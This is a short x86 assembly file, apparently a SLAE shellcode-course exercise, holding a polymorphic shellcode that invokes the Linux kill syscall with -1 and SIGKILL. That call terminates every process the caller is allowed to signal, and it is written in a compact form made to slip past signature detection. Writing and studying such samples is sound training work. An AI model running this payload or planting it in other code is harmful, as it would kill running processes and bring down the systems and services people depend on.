; Filename: shellcode1.poly.nasm
; Author:  SLAE-935
;
; Purpose: execute kill(-1, SIGKILL)

section .text
        global _start
 
_start:
        ; kill(-1, SIGKILL);
        add al, 37
        not ebx
        add cl, 9
        int 0x80